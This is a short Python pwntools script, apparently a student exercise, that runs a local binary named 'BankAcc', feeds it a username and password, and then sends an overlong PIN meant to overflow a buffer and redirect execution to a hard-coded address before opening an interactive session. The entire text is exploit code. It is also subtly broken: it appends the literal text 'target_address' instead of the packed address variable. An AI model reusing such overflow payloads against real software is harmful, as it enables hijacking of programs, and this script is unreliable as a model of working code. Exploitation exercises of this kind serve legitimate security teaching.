from pwn import *

target_address = p64(4199760) 
garbageUser = b'UniPD_Student'
garbagePw = b'P10v3go!'
garbagePin = '1234' + '0'*(4+8+8)+'target_address'
p = process('./BankAcc') 
p.sendline(garbageUser) 
p.sendline(garbagePw) 
p.sendline(garbagePin) 
p.interactive()